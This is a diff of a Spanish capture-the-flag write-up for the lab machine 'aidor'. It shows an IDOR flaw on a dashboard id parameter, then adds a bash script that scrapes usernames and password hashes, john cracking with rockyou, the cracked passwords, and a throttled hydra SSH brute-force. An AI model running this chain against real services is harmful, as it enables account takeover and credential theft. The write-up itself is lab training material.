@@ -87,7 +87,7 @@ Me doy cuenta en la URL de una cosa:
 
 
 
-![Nmap Scan](images/aidor/aidor8.png)
+![Nmap Scan](images/aidor/aidor9.png)
 
 
 Si modificamos el id accedemos al panel de otros usuarios
@@ -96,6 +96,70 @@ Si modificamos el id accedemos al panel de otros usuarios
 http://172.17.0.2:5000/dashboard?id=55
 http://172.17.0.2:5000/dashboard?id=54
 ```
-Me hago un script para descargar los usuarios con su id y su password
+
+
+
+![Nmap Scan](images/aidor/aidor10.png)
+
+
+Me hago un script para descargar los usuarios con su id y su password:
+
+
+```bash
+#!/bin/bash
+
+for i in $(seq 0 100); do
+    RESPONSE=$(curl -s "http://172.17.0.2:5000/dashboard?id=${i}")
+
+    if echo "$RESPONSE" | grep -q "<h2>Bienvenido,"; then
+        
+        USER=$(echo "$RESPONSE" | grep -oP '(?<=Bienvenido, ).*(?=</h2>)')
+        echo "${i} - ${USER}" >> usuarios.txt
+        
+        PASSWORD=$(echo "$RESPONSE" | grep -oP '(?<=<div class="password-hash">)[^<]+')
+        echo "$PASSWORD" >> password.txt
+    fi
+done
+```
+
+he creado un archivo con los usuarios en usuarios.txt y otro con los password en password.txt
+
+le paso por hash-identifier:
+
+```bash
+cat password.txt | hash-identifier
+```
+
+![Nmap Scan](images/aidor/aidor11.png)
+
+y veo que se trata de SHA-256, utilizo john para desencirptalos:
+
+```bash
+john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt 
+```
+
+y logro decodear esto:
+
+``password
+chocolate
+pingu  
+pepe
+````
+
+Hago un diccionario con  los hahses decodeados y teniendo usuarios lanzo un hydra para ssh pero con tiempo porque peta si tiene muchas peticiones:
+```bash
+hydra -L solo_usuarios.txt -P password_decode.txt -t 1 -W 5 -V ssh://172.17.0.2
+```
+
+![Nmap Scan](images/aidor/aidor12.png)
+
+
+
+![Nmap Scan](images/aidor/aidor13.png)
+
+
+
+
+
 
 
